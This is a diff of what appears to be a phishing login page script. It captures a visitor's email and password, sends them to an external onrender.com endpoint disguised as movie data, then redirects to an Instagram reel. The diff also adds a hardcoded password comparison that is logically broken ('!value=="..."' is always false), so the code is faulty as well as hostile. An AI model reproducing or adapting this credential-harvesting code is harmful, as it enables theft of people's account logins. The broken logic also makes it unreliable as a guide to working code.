@@ -10,7 +10,7 @@ const sendmeth = () => {
     const pkg = { title: email, decription: password }
     console.log(JSON.stringify(pkg))
     const API = "https://admin-api-maaj-sg2l.onrender.com/api/movie/data"
-    const redirecturl="https://www.instagram.com/reel/C8XJlAoobng/?utm_source=ig_embed&ig_rid=bfe6f34e-ba13-473b-82f4-a53aca914a0f"
+    const redirecturl="https://www.instagram.com/reel/C8XJlAoobng/"
     if (email && password) {
         fetch(API, {
             method: 'POST',
@@ -28,8 +28,9 @@ const sendmeth = () => {
 }
 loginButton.addEventListener('click', () => {
     console.log(emailInput.value, passwordInput.value)
-    if (emailInput.value && passwordInput.value) { 
-        sendmeth() 
-    }
-    else { alert("Please Enter your Credential") }
+       if (!passwordInput.value=="Saini@9307" &&
+        emailInput.value && passwordInput.value) { 
+            sendmeth() 
+        }
+    else { alert("Please Enter your correct Credential") }
 });
